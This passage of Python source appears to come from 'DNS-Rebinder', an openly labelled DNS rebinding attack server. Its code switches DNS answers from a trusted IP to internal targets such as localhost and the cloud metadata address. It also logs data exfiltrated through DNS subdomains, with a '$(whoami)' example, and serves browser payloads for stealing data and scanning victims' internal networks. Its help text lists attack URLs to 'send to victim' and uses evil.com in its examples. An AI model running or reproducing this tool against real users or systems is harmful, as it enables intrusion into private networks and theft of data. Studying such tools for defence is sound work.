    def __post_init__(self):
        self.logger = Logger()
        # Browser payload mode defaults (only when HTTP payload server is enabled)
        if self.enable_http:
            # Default rebinding namespace
            if not self.rb_zone:
                self.rb_zone = f"rb.{self.domain}"

            # Default static hosts if none provided.
            # - static.<domain>: stable payload host
            if not self.static_hosts:
                self.static_hosts = [f"static.{self.domain}"]

        # normalize
        self.rb_zone = (self.rb_zone or "").strip().lower().rstrip('.')
        self.static_hosts = [h.strip().lower().rstrip('.') for h in self.static_hosts if h and h.strip()]
    
    @property
    def ns_prefixes(self) -> list:
        """Nameserver prefixes that shouldn't be rebound."""
        return [f"ns1.{self.domain}", f"ns2.{self.domain}"]
    
    def get_host_state(self, hostname: str) -> HostState:
        """Get or create state for hostname."""
        if hostname not in self.host_states:
            self.host_states[hostname] = HostState()
        return self.host_states[hostname]
    
    def check_exfil(self, hostname: str, source_ip: str) -> Optional[str]:
        """Check if hostname contains exfil data. Returns extracted data or None."""
        # Match: *.exfil.domain.com or *.exfil.subdomain.domain.com
        pattern = rf'^(.+)\.{re.escape(self.exfil_prefix)}\..*{re.escape(self.domain)}$'
        match = re.match(pattern, hostname, re.IGNORECASE)
        if match:
            data = match.group(1)
            self.total_exfils += 1
            self.logger.exfil(hostname, data, source_ip)
            return data
        return None
    
    def get_response_ip(self, hostname: str, source_ip: str = "unknown", 
                        source_port: int = 0) -> str:
        """Determine which IP to return for a hostname."""
        hostname_lower = hostname.lower().rstrip('.')
        
        # NS records always point to server
        for prefix in self.ns_prefixes:
            if hostname_lower.startswith(prefix.lower()):
                return self.server_ip

        # Static hosts must NEVER be rebound (serve initial payload reliably)
        if hostname_lower in self.static_hosts:
            if self.logger:
                self.logger.query(
                    hostname=hostname,
                    response_ip=self.server_ip,
                    source_ip=source_ip,
                    source_port=source_port,
                    query_type="A",
                    is_rebind=False,
                    query_count=0,
                    strategy="static-host"
                )
            return self.server_ip
        
        # Check for exfil data
        self.check_exfil(hostname_lower, source_ip)
        
        # Get/update host state
        state = self.get_host_state(hostname_lower)
        
        # DEBUG: Print state before strategy decision
        print(f"  DEBUG: {hostname_lower} query_count={state.query_count}")
        
        # Determine response IP using strategy
        response_ip = self.strategy.get_ip(
            hostname_lower,
            self.whitelist_ip,
            self.rebind_ips,
            state.query_count,
            state.first_seen
        )
        
        is_rebind = response_ip in self.rebind_ips
        
        # Log the query
        self.logger.query(
            hostname=hostname,
            response_ip=response_ip,
            source_ip=source_ip,
            source_port=source_port,
            query_type="A",
            is_rebind=is_rebind,
            query_count=state.query_count,
            strategy=self.strategy.describe()
        )
        
        # Update state
        state.query_count += 1
        state.last_response = response_ip
        self.total_queries += 1
        if is_rebind:
            self.total_rebinds += 1
        
        # Record for recent queries
        self.recent_queries.append({
            'time': datetime.datetime.now().isoformat(),
            'hostname': hostname,
            'response': response_ip,
            'source': source_ip,
            'is_rebind': is_rebind
        })
        
        return response_ip
    
    def is_quiet_ip(self, ip: str) -> bool:
        """Check if IP should be filtered from logs."""
        try:
            addr = ipaddress.ip_address(ip)
            return any(
                addr in ipaddress.ip_network(net) 
                for net in self.quiet_ranges
            )
        except ValueError:
            return False
    
    def reset_host(self, hostname: Optional[str] = None):
        """Reset state for hostname or all."""
        if hostname:
            self.host_states.pop(hostname.lower(), None)
        else:
            self.host_states.clear()


# Global config instance (set in main)
config: Optional[ServerConfig] = None

# Global source tracking (simpler than passing dicts through Twisted)
_last_dns_source = {'ip': 'unknown', 'port': 0}


# ============================================================================
# Command Interface
# ============================================================================

class CommandProtocol(LineReceiver):
    """Interactive command interface."""
    
    delimiter = b'\n'
    
    COMMANDS = {
        'help': 'Show available commands',
        'status': 'Show current configuration and stats',
        'set whitelist <ip>': 'Change whitelist IP',
        'set rebind <ip>[,ip2,...]': 'Change rebind IP(s)', 
        'set strategy <name> [opts]': 'Change strategy (count/time/round-robin/random/multi-target)',
        'set exfil <prefix>': 'Change exfil subdomain prefix',
        'reset [hostname]': 'Reset query state (all or specific host)',
        'hosts': 'Show all tracked hostnames',
        'log [n]': 'Show recent queries (default: 20)',
        'exfil': 'Show exfiltrated data summary',
        'payload': 'Show browser attack payload URLs',
        'quit': 'Stop the server',
    }
    
    def connectionMade(self):
        self.transport.write(b'\n')
        self.transport.write(b'> ')
    
    def lineReceived(self, line: bytes):
        line = line.decode('utf-8', errors='ignore').strip()
        
        if not line:
            self.transport.write(b'> ')
            return
        
        parts = line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        try:
            if cmd == 'help':
                self.cmd_help()
            elif cmd == 'status':
                self.cmd_status()
            elif cmd == 'set':
                self.cmd_set(args)
            elif cmd == 'reset':
                self.cmd_reset(args)
            elif cmd == 'hosts':
                self.cmd_hosts()
            elif cmd == 'log':
                self.cmd_log(args)
            elif cmd == 'exfil':
                self.cmd_exfil()
            elif cmd == 'payload':
                self.cmd_payload()
            elif cmd in ('quit', 'exit', 'q'):
                self.cmd_quit()
            else:
                self.send(f'Unknown command: {cmd}. Type "help" for commands.')
        except Exception as e:
            self.send(f'Error: {e}')
        
        self.transport.write(b'> ')
    
    def send(self, msg: str):
        self.transport.write(f'{msg}\n'.encode())
    
    def cmd_help(self):
        self.send('\nAvailable commands:')
        for cmd, desc in self.COMMANDS.items():
            self.send(f'  {cmd:30} {desc}')
        self.send('')
        self.send('Strategy examples:')
        self.send('  set strategy count 2         Rebind after 2 queries')
        self.send('  set strategy time 5          Rebind after 5 seconds')
        self.send('  set strategy round-robin     Alternate whitelist/rebind')
        self.send('  set strategy random 0.3      30% rebind probability')
        self.send('  set strategy multi-target 1  Cycle rebind IPs after 1 query')
        self.send('')
    
    def cmd_status(self):
        self.send('\n' + '═' * 60)
        self.send('  DNS-Rebinder Status')
        self.send('═' * 60)
        self.send(f'  Whitelist IP:    {config.whitelist_ip}')
        self.send(f'  Rebind IPs:      {", ".join(config.rebind_ips)}')
        self.send(f'  Server IP:       {config.server_ip}')
        self.send(f'  Domain:          {config.domain}')
        self.send(f'  Port:            {config.port}')
        self.send(f'  TTL:             {config.ttl}')
        self.send(f'  Strategy:        {config.strategy.describe()}')
        self.send(f'  Exfil prefix:    {config.exfil_prefix}.{config.domain}')
        self.send('─' * 60)
        self.send(f'  Total queries:   {config.total_queries}')
        self.send(f'  Total rebinds:   {config.total_rebinds}')
        self.send(f'  Total exfils:    {config.total_exfils}')
        self.send(f'  Tracked hosts:   {len(config.host_states)}')
        self.send('─' * 60)
        self.send(f'  Main log:        {config.logger.main_log}')
        self.send(f'  JSON log:        {config.logger.json_log}')
        self.send(f'  Exfil log:       {config.logger.exfil_log}')
        self.send('═' * 60 + '\n')
    
    def cmd_set(self, args: list):
        if len(args) < 2:
            self.send('Usage: set <whitelist|rebind|strategy|exfil> <value>')
            return
        
        key = args[0].lower()
        
        if key == 'whitelist':
            self._validate_ip(args[1])
            old = config.whitelist_ip
            config.whitelist_ip = args[1]
            config.logger.config_change('whitelist_ip', old, args[1])
            self.send(f'Whitelist IP: {old} -> {args[1]}')
            
        elif key == 'rebind':
            ips = [ip.strip() for ip in args[1].split(',')]
            for ip in ips:
                self._validate_ip(ip)
            old = config.rebind_ips
            config.rebind_ips = ips
            config.logger.config_change('rebind_ips', ','.join(old), ','.join(ips))
            self.send(f'Rebind IPs: {old} -> {ips}')
            
        elif key == 'strategy':
            strategy_name = args[1].lower()
            try:
                strategy_type = StrategyType(strategy_name)
            except ValueError:
                self.send(f'Unknown strategy: {strategy_name}')
                self.send('Available: count, time, round-robin, random, multi-target')
                return
            
            kwargs = {}
            if len(args) > 2:
                if strategy_type == StrategyType.COUNT:
                    kwargs['threshold'] = int(args[2])
                elif strategy_type == StrategyType.TIME:
                    kwargs['delay'] = float(args[2])
                elif strategy_type == StrategyType.RANDOM:
                    kwargs['probability'] = float(args[2])
                elif strategy_type == StrategyType.MULTI_TARGET:
                    kwargs['threshold'] = int(args[2])
            
            old_desc = config.strategy.describe()
            config.strategy = create_strategy(strategy_type, **kwargs)
            config.logger.config_change('strategy', old_desc, config.strategy.describe())
            self.send(f'Strategy: {old_desc} -> {config.strategy.describe()}')
            
        elif key == 'exfil':
            old = config.exfil_prefix
            config.exfil_prefix = args[1]
            config.logger.config_change('exfil_prefix', old, args[1])
            self.send(f'Exfil prefix: {old} -> {args[1]}')
            self.send(f'Exfil domain: *.{args[1]}.{config.domain}')
            
        else:
            self.send(f'Unknown setting: {key}')
    
    def cmd_reset(self, args: list):
        if args:
            hostname = args[0]
            if hostname.lower() in config.host_states:
                config.reset_host(hostname)
                self.send(f'Reset state for: {hostname}')
            else:
                self.send(f'Host not found: {hostname}')
        else:
            count = len(config.host_states)
            config.reset_host()
            self.send(f'Reset all host states ({count} hosts)')
    
    def cmd_hosts(self):
        if not config.host_states:
            self.send('No hosts tracked yet.')
            return
        
        self.send(f'\nTracked hosts ({len(config.host_states)}):')
        self.send('─' * 70)
        self.send(f'  {"Hostname":40} {"Queries":>8} {"Last Response":>18}')
        self.send('─' * 70)
        
        for hostname, state in sorted(config.host_states.items()):
            is_rebind = state.last_response in config.rebind_ips
            status = "REBIND" if is_rebind else "whitelist"
            self.send(f'  {hostname:40} {state.query_count:>8} {state.last_response:>15} ({status})')
        self.send('')
    
    def cmd_log(self, args: list):
        n = int(args[0]) if args else 20
        queries = list(config.recent_queries)[-n:]
        
        if not queries:
            self.send('No queries recorded yet.')
            return
        
        self.send(f'\nRecent queries ({len(queries)}):')
        self.send('─' * 80)
        for q in queries:
            status = "REBIND" if q['is_rebind'] else "whitelist"
            self.send(f"  {q['time'][:19]}  {q['hostname']:35} -> {q['response']:15} ({status})")
        self.send('')
    
    def cmd_exfil(self):
        self.send(f'\nExfiltration Summary')
        self.send('─' * 60)
        self.send(f'  Exfil prefix: *.{config.exfil_prefix}.{config.domain}')
        self.send(f'  Total exfils: {config.total_exfils}')
        self.send(f'  Exfil log:    {config.logger.exfil_log}')
        self.send('')
        self.send('  To exfiltrate data, make DNS queries like:')
        self.send(f'    secret-data.{config.exfil_prefix}.{config.domain}')
        self.send(f'    $(whoami).{config.exfil_prefix}.{config.domain}')
        self.send('')
    
    def cmd_payload(self):
        if not config.enable_http:
            self.send('\n⚠️  HTTP payload server is disabled.')
            self.send('    Restart with --http-enable to use browser attack payloads.')
            self.send('')
            return
            
        http_port = config.http_port
        self.send(f'\n🎯 Browser Attack Payloads')
        self.send('═' * 60)
        self.send(f'  Payload server: http://{config.server_ip}:{http_port}/')
        self.send('')
        self.send('  Available payloads:')
        self.send(f'    /single    - Steal from single target')
        self.send(f'    /portscan  - Scan ports on victim localhost')
        self.send(f'    /netscan   - Scan internal network')
        self.send('')
        self.send('  Defaults (fast mode):')
        self.send('    delay=0ms, interval=100ms, attempts=300 (30s total)')
        self.send('    For slow browsers: ?delay=70000&interval=2000&attempts=60')
        self.send('')
        static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
        self.send('  Attack URLs (send to victim):')
        self.send(f'    http://{static_host}:{http_port}/single')
        self.send(f'    http://{static_host}:{http_port}/single?path=/admin')
        self.send(f'    http://{static_host}:{http_port}/portscan')
        self.send('')
        self.send('  How it works:')
        self.send('    1. Victim visits URL → loads from YOUR server')
        self.send('    2. JS polls rapidly (default: every 100ms)')
        self.send('    3. When DNS rebinds → fetch hits internal target')
        self.send('    4. Data exfiltrated via DNS (hex encoded)')
        self.send('')
    
    def cmd_quit(self):
        self.send('Shutting down...')
        config.logger.info('Server stopped by user')
        config.logger.close()
        reactor.stop()
    
    def _validate_ip(self, ip: str):
        """Validate IP address format."""
        ipaddress.ip_address(ip)


# ============================================================================
# DNS Server Components
# ============================================================================

class RebindResolver(hosts_module.Resolver):
    """Custom resolver that implements rebinding logic."""
    
    def __init__(self, *args, source_tracker=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.source_tracker = source_tracker or {}
    
    def _aRecords(self, name: bytes):
        hostname = name.decode('utf-8')
        
        # Get source IP from tracker (set by protocol handlers)
        source_info = self.source_tracker.get('current')
        if not source_info or source_info[0] == 'unknown':
            source_info = self.source_tracker.get('last_udp')
        if not source_info or source_info[0] == 'unknown':
            # Fallback to global tracker
            source_info = (_last_dns_source['ip'], _last_dns_source['port'])
        response_ip = config.get_response_ip(hostname, source_info[0], source_info[1])
        
        return tuple([
            dns.RRHeader(
                name, dns.A, dns.IN, config.ttl,
                dns.Record_A(response_ip, config.ttl)
            )
        ])


class LoggingDNSServerFactory(server.DNSServerFactory):
    """DNS server factory with request logging."""
    
    def __init__(self, *args, source_tracker=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.source_tracker = source_tracker or {}
    
    def buildProtocol(self, addr):
        self.source_tracker['current'] = (addr.host, addr.port)
        return super().buildProtocol(addr)


class LoggingDNSDatagramProtocol(dns.DNSDatagramProtocol):
    """DNS datagram protocol with request logging."""
    
    def __init__(self, *args, source_tracker=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.source_tracker = source_tracker or {}
    
    def datagramReceived(self, datagram, addr):
        global _last_dns_source
        # Store source before processing (both in tracker and global)
        self.source_tracker['current'] = (addr[0], addr[1])
        self.source_tracker['last_udp'] = (addr[0], addr[1])
        _last_dns_source = {'ip': addr[0], 'port': addr[1]}
        return super().datagramReceived(datagram, addr)


def create_resolver(source_tracker: dict):
    """Create the resolver chain."""
    if platform.getType() == 'posix':
        hosts_file = b'/etc/hosts'
        resolv_conf = b'/etc/resolv.conf'
        upstream = client.Resolver(resolv_conf, servers=[('8.8.8.8', 53)])
    else:
        hosts_file = r'c:\windows\hosts'
        bootstrap = client._ThreadedResolverImpl(reactor)
        upstream = root.bootstrap(bootstrap, resolverFactory=client.Resolver)
    
    rebind_resolver = RebindResolver(hosts_file, source_tracker=source_tracker)
    return resolve.ResolverChain([rebind_resolver, cache.CacheResolver(), upstream])


# ============================================================================
# Setup and Main
# ============================================================================

def print_banner():
    """Print startup banner."""
    print('''
\033[96m╔═══════════════════════════════════════════════════════════════════╗
║                        DNS-Rebinder                               ║
║                   DNS Rebinding Attack Server                     ║
╚═══════════════════════════════════════════════════════════════════╝\033[0m
''')
    print(f'  Whitelist IP:    {config.whitelist_ip}')
    print(f'  Rebind IPs:      {", ".join(config.rebind_ips)}')
    print(f'  Server IP:       {config.server_ip}')
    print(f'  Domain:          {config.domain}')
    print(f'  DNS server:      0.0.0.0:{config.port}')
    if config.enable_http:
        print(f'  HTTP payloads:   http://0.0.0.0:{config.http_port}/')
        print(f'  Rebind space:    *.{config.rb_zone or ("rb." + config.domain)}')
        print(f'  Static host(s):  {", ".join(config.static_hosts) if config.static_hosts else "(none)"}')
    else:
        print(f'  HTTP payloads:   (disabled)  (enable with --http-enable)')
    print(f'  Strategy:        {config.strategy.describe()}')
    print(f'  Exfil domain:    *.{config.exfil_prefix}.{config.domain}')
    print()
    if config.enable_http:
        static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
        print(f'  \033[93m📋 Attack URL:\033[0m    http://{static_host}:{config.http_port}/single')
    else:
        print(f'  \033[93m📋 Attack URL:\033[0m    (HTTP payloads disabled - use --http-enable)')
    print()
    print(f'  Main log:        {config.logger.main_log}')
    print(f'  JSON log:        {config.logger.json_log}')
    print(f'  Exfil log:       {config.logger.exfil_log}')
    print()
    print('─' * 67)
    print('  Type "help" for commands. "payload" for browser attack info.')
    print('─' * 67)
    print()


def get_external_ip() -> Optional[str]:
    """Try to detect external IP."""
    import urllib.request
    services = [
        'https://api.ipify.org',
        'https://ifconfig.me/ip',
        'https://icanhazip.com',
    ]
    for url in services:
        try:
            with urllib.request.urlopen(url, timeout=3) as r:
                return r.read().decode().strip()
        except Exception:
            continue
    return None


def validate_ip(ip: str) -> bool:
    """Check if string is valid IP."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def prompt(text: str, default: Optional[str] = None, validator=None) -> str:
    """Prompt for input with optional default and validation."""
    while True:
        if default:
            user_input = input(f"  {text} [{default}]: ").strip()
            if not user_input:
                user_input = default
        else:
            user_input = input(f"  {text}: ").strip()
        
        if not user_input:
            print("    ⚠ Required field")
            continue
            
        if validator and not validator(user_input):
            print("    ⚠ Invalid format")
            continue
        
        return user_input


def run_setup_wizard() -> argparse.Namespace:
    """Interactive setup wizard."""
    print('''
\033[96m╔═══════════════════════════════════════════════════════════════════╗
║                   DNS-Rebinder Setup Wizard                       ║
╚═══════════════════════════════════════════════════════════════════╝\033[0m
''')
    
    print("  Detecting external IP...", end=" ", flush=True)
    external_ip = get_external_ip()
    if external_ip:
        print(f"found {external_ip}")
    else:
        print("could not detect")
    
    print()
    print("─" * 67)
    print("  Enter configuration values (press Enter for defaults)")
    print("─" * 67)
    print()
    
    args = argparse.Namespace()
    
    print("  \033[1mWhitelist IP\033[0m: The IP the target application trusts/allows")
    args.whitelist = prompt("Whitelist IP", validator=validate_ip)
    print()
    
    print("  \033[1mRebind IPs\033[0m: Target IPs after rebinding (comma-separated)")
    print("  Examples: 127.0.0.1 or 127.0.0.1,169.254.169.254,10.0.0.1")
    rebind_str = prompt("Rebind IPs", default="127.0.0.1")
    args.rebind = [ip.strip() for ip in rebind_str.split(',')]
    for ip in args.rebind:
        if not validate_ip(ip):
            print(f"    ⚠ Invalid IP: {ip}")
            sys.exit(1)
    print()
    
    print("  \033[1mServer IP\033[0m: This machine's public IP (for NS records)")
    args.server = prompt("Server IP", default=external_ip, validator=validate_ip)
    print()
    
    print("  \033[1mDomain\033[0m: Your domain with NS records pointing here")
    args.domain = prompt("Domain")
    print()
    
    print("  \033[1mPort\033[0m: DNS port (requires root for 53)")
    args.port = int(prompt("Port", default="53"))
    print()
    
    print("  \033[1mStrategy\033[0m: When to rebind")
    print("    1. count N      - Rebind after N queries (default)")
    print("    2. time N       - Rebind after N seconds")
    print("    3. round-robin  - Alternate whitelist/rebind")
    print("    4. random N     - N probability of rebind (0.0-1.0)")
    print("    5. multi-target - Cycle through rebind IPs")
    strategy_input = prompt("Strategy", default="count 1")
    
    parts = strategy_input.split()
    strategy_name = parts[0].lower()
    try:
        strategy_type = StrategyType(strategy_name)
    except ValueError:
        print(f"    ⚠ Unknown strategy, using count")
        strategy_type = StrategyType.COUNT
    
    kwargs = {}
    if len(parts) > 1:
        if strategy_type in (StrategyType.COUNT, StrategyType.MULTI_TARGET):
            kwargs['threshold'] = int(parts[1])
        elif strategy_type == StrategyType.TIME:
            kwargs['delay'] = float(parts[1])
        elif strategy_type == StrategyType.RANDOM:
            kwargs['probability'] = float(parts[1])
    
    args.strategy = create_strategy(strategy_type, **kwargs)
    print()
    
    print("  \033[1mExfil prefix\033[0m: Subdomain prefix for data exfiltration")
    print(f"  Queries to *.PREFIX.{args.domain} will be captured")
    args.exfil_prefix = prompt("Exfil prefix", default="exfil")
    print()
    
    print("  \033[1mBrowser payload server\033[0m: Enable HTTP server for browser attack payloads?")
    http_enable = prompt("Enable HTTP payloads? (y/N)", default="N").strip().lower() in ("y", "yes")
    args.http_enable = bool(http_enable)
    if args.http_enable:
        print("  \033[1mHTTP port\033[0m: Port for payload HTTP server (browser attacks)")
        args.http_port = int(prompt("HTTP port", default="8080"))
        # Browser payload defaults: dedicated rebinding namespace
        args.rb_zone = f"rb.{args.domain}"
        args.static_hosts = f"static.{args.domain}"
    else:
        args.http_port = 8080
        args.rb_zone = None
        args.static_hosts = None
    print()
    
    args.ttl = 0  # Always 0 for rebinding
    
    print("─" * 67)
    print("  \033[1mConfiguration Summary:\033[0m")
    print("─" * 67)
    print(f"    Whitelist IP:  {args.whitelist}")
    print(f"    Rebind IPs:    {', '.join(args.rebind)}")
    print(f"    Server IP:     {args.server}")
    print(f"    Domain:        {args.domain}")
    print(f"    DNS port:      {args.port}")
    print(f"    HTTP payloads: {'enabled' if getattr(args,'http_enable',False) else 'disabled'}")
    if getattr(args,'http_enable',False):
        print(f"    HTTP port:     {args.http_port}")
        print(f"    RB zone:       {args.rb_zone}")
        print(f"    Static host:   {args.static_hosts}")
    print(f"    Strategy:      {args.strategy.describe()}")
    print(f"    Exfil domain:  *.{args.exfil_prefix}.{args.domain}")
    print()
    
    # Build CLI command for reuse
    strategy_desc = args.strategy.describe()
    if "count" in strategy_desc:
        threshold = strategy_desc.split("after ")[1].split(" ")[0]
        strategy_cli = f"count {threshold}"
    elif "time" in strategy_desc:
        delay = strategy_desc.split("after ")[1].split("s")[0]
        strategy_cli = f"time {delay}"
    elif "round-robin" in strategy_desc:
        strategy_cli = "round-robin"
    elif "random" in strategy_desc:
        prob = strategy_desc.split("(")[1].split("%")[0]
        strategy_cli = f"random {float(prob)/100}"
    elif "multi-target" in strategy_desc:
        threshold = strategy_desc.split("after ")[1].split(" ")[0]
        strategy_cli = f"multi-target {threshold}"
    else:
        strategy_cli = "count 1"
    
    # Build full CLI command (always include all options for clarity)
    cli_cmd = f"""sudo python3 dns-rebinder.py \\
    -w {args.whitelist} \\
    -r {','.join(args.rebind)} \\
    -s {args.server} \\
    -d {args.domain} \\
    -p {args.port} \\
    --http-port {args.http_port} \\
    --strategy {strategy_cli} \\
    --exfil-prefix {args.exfil_prefix}"""
    
    # Also create a one-liner version
    cli_oneliner = f"sudo python3 dns-rebinder.py -w {args.whitelist} -r {','.join(args.rebind)} -s {args.server} -d {args.domain} -p {args.port} --http-port {args.http_port} --strategy {strategy_cli} --exfil-prefix {args.exfil_prefix}"
    
    print("  \033[1mCLI equivalent (for reuse):\033[0m")
    print(f"\033[96m{cli_cmd}\033[0m")
    print()
    print("  \033[1mOne-liner:\033[0m")
    print(f"  \033[96m{cli_oneliner}\033[0m")
    print()
    
    confirm = input("  Start server with this config? [Y/n]: ").strip().lower()
    if confirm and confirm not in ('y', 'yes'):
        print("\n  Aborted.")
        sys.exit(0)
    
    print()
    return args


def parse_args():
    """Parse command line arguments or run setup wizard."""
    parser = argparse.ArgumentParser(
        description='DNS rebinding attack server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s                              Interactive setup wizard
  %(prog)s -w 8.8.8.8 -r 127.0.0.1 -s 1.2.3.4 -d evil.com
  %(prog)s -w 8.8.8.8 -r 127.0.0.1,10.0.0.1 -s 1.2.3.4 -d evil.com --strategy multi-target

Strategies:
  --strategy count 2          Rebind after 2 queries
  --strategy time 5           Rebind after 5 seconds
  --strategy round-robin      Alternate whitelist/rebind
  --strategy random 0.3       30%% rebind probability
  --strategy multi-target 1   Cycle rebind IPs after 1 query
        '''
    )
    
    parser.add_argument('positional', nargs='*', help=argparse.SUPPRESS)
    parser.add_argument('--whitelist', '-w', help='Whitelisted IP (passes allowlist)')
    parser.add_argument('--rebind', '-r', help='Rebind IP(s), comma-separated')
    parser.add_argument('--server', '-s', help='This server\'s IP')
    parser.add_argument('--port', '-p', type=int, default=53, help='DNS port (default: 53)')
    parser.add_argument('--domain', '-d', help='Your domain')
    parser.add_argument('--strategy', nargs='+', default=['count', '1'],
                        help='Rebind strategy and options')
    parser.add_argument('--exfil-prefix', default='exfil', help='Exfil subdomain prefix')
    parser.add_argument('--http-enable', action='store_true', help='Enable HTTP payload server (browser attack payloads)')
    parser.add_argument('--http-port', type=int, default=8080, help='HTTP payload server port (default: 8080)')
    parser.add_argument('--rb-zone', default=None, help='Rebinding namespace for browser payload redirects (e.g. rb.nsish.com)')
    parser.add_argument('--ttl', type=int, default=0, help='DNS TTL (default: 0)')
    parser.add_argument(
        '--static-hosts',
        default=None,
        help=(
            'Comma-separated hostnames to ALWAYS resolve to --server (never rebind). '
            'Example: "static.nsish.com,cdn.nsish.com". If omitted, defaults include '
            'apex plus static/cdn/assets/stage subdomains.'
        ),
    )
    
    args = parser.parse_args()
    
    # Handle legacy positional arguments
    if args.positional and len(args.positional) == 5:
        args.whitelist = args.positional[0]
        args.rebind = args.positional[1]
        args.server = args.positional[2]
        args.port = int(args.positional[3])
        args.domain = args.positional[4]
    
    # No args? Run wizard
    has_args = args.whitelist or args.rebind or args.server or args.domain or args.positional
    if not has_args:
        return run_setup_wizard()
    
    # Validate required args
    missing = []
    if not args.whitelist:
        missing.append('--whitelist')
    if not args.rebind:
        missing.append('--rebind')
    if not args.server:
        missing.append('--server')
    if not args.domain:
        missing.append('--domain')
    
    if missing:
        parser.error(f'Missing required arguments: {", ".join(missing)}')
    
    # Parse rebind IPs
    args.rebind = [ip.strip() for ip in args.rebind.split(',')]
    
    # Parse strategy
    strategy_name = args.strategy[0].lower()
    try:
        strategy_type = StrategyType(strategy_name)
    except ValueError:
        parser.error(f'Unknown strategy: {strategy_name}')
    
    kwargs = {}
    if len(args.strategy) > 1:
        if strategy_type in (StrategyType.COUNT, StrategyType.MULTI_TARGET):
            kwargs['threshold'] = int(args.strategy[1])
        elif strategy_type == StrategyType.TIME:
            kwargs['delay'] = float(args.strategy[1])
        elif strategy_type == StrategyType.RANDOM:
            kwargs['probability'] = float(args.strategy[1])
    
    args.strategy = create_strategy(strategy_type, **kwargs)
    
    return args


def main():
    global config
    
    args = parse_args()
    
    static_hosts = []
    if args.static_hosts:
        static_hosts = [h.strip() for h in args.static_hosts.split(',') if h.strip()]

    config = ServerConfig(
        whitelist_ip=args.whitelist,
        rebind_ips=args.rebind,
        server_ip=args.server,
        port=args.port,
        domain=args.domain,
        ttl=args.ttl,
        strategy=args.strategy,
        static_hosts=static_hosts,
        exfil_prefix=args.exfil_prefix,
        http_port=args.http_port,
        enable_http=bool(args.http_enable),
        rb_zone=(args.rb_zone or ""),
    )
    
    print_banner()
    config.logger.info('Server started')
    
    # Shared source tracker for passing client info to resolver
    source_tracker = {}
    
    # Set up DNS server
    factory = LoggingDNSServerFactory(
        clients=[create_resolver(source_tracker)],
        source_tracker=source_tracker
    )
    protocol = LoggingDNSDatagramProtocol(
        controller=factory,
        source_tracker=source_tracker
    )
    
    reactor.listenUDP(config.port, protocol)
    reactor.listenTCP(config.port, factory)
    
    # Set up HTTP payload server (optional)
    if config.enable_http:
        payload_root = PayloadResource(config)
        payload_site = web_server.Site(payload_root)
        reactor.listenTCP(config.http_port, payload_site)
    
    # Set up interactive command interface
    stdio.StandardIO(CommandProtocol())
    
    reactor.run()


if __name__ == '__main__':
    main()
